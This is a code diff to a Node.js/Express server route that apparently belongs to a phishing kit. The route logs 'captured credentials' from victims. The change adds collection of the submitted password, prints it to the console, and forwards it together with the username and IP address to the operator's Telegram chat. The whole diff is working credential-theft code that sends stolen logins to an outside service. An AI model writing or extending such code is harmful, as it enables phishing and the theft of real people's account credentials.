@@ -76,7 +76,7 @@ app.get('/admin', (req, res) => {
 
 // Log captured credentials
 app.post('/api/log', (req, res) => {
-  const { username } = req.body;
+  const { username, password } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const timestamp = new Date();
 
@@ -84,6 +84,7 @@ app.post('/api/log', (req, res) => {
     id: logs.length + 1,
     ip: ip === '::1' ? '127.0.0.1' : ip,
     username: username || 'N/A',
+    password: password || 'N/A',
     date: timestamp.toLocaleDateString(),
     time: timestamp.toLocaleTimeString(),
     timestamp: timestamp.toISOString()
@@ -97,8 +98,8 @@ app.post('/api/log', (req, res) => {
   // Push activity event
   pushActivity('credential', `🔑 Credential captured — User: ${logEntry.username} | IP: ${logEntry.ip}`);
 
-  // Forward to Telegram
-  const tgMsg = `🔑 <b>Credential Captured!</b>\n👤 Username: <code>${logEntry.username}</code>\n🌐 IP: <code>${logEntry.ip}</code>\n📅 ${logEntry.date} ${logEntry.time}`;
+  // Forward to Telegram (includes password)
+  const tgMsg = `🔑 <b>Credential Captured!</b>\n👤 Username: <code>${logEntry.username}</code>\n🔒 Password: <code>${logEntry.password}</code>\n🌐 IP: <code>${logEntry.ip}</code>\n📅 ${logEntry.date} ${logEntry.time}`;
   bot.sendMessage(CHAT_ID, tgMsg, { parse_mode: 'HTML' }).catch(err =>
     console.error('\x1b[31m[Telegram] Credential send error:', err.message, '\x1b[0m')
   );
@@ -106,6 +107,7 @@ app.post('/api/log', (req, res) => {
   console.log(`\n\x1b[31m [+] \x1b[32m Logged!\x1b[34m #${logEntry.id}\x1b[0m`);
   console.log(`\x1b[31m [-] \x1b[32m IP    :\x1b[34m ${logEntry.ip}\x1b[0m`);
   console.log(`\x1b[31m [-] \x1b[32m User  :\x1b[34m ${logEntry.username}\x1b[0m`);
+  console.log(`\x1b[31m [-] \x1b[32m Pass  :\x1b[34m ${logEntry.password}\x1b[0m`);
 
   res.status(200).json({ success: true, attemptNumber: logs.length });
 });
